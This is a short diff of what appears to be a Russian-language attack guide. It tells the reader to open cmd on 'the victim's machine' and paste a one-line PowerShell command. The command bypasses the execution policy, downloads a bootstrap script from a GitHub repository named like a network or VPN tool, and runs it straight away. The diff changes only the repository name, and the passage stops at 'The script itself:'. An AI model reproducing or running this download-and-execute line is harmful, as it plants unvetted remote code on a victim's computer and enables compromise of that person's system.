@@ -17,7 +17,7 @@
 Открой `cmd` на машине жертвы и вставь одну строку:
 
 ```
-powershell -ExecutionPolicy Bypass -Command "iwr -useb https://raw.githubusercontent.com/metiric/netguard/main/bootstrap.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "iwr -useb https://raw.githubusercontent.com/metiric/vpnparalellll/main/bootstrap.ps1 | iex"
 ```
 
 Скрипт сам:
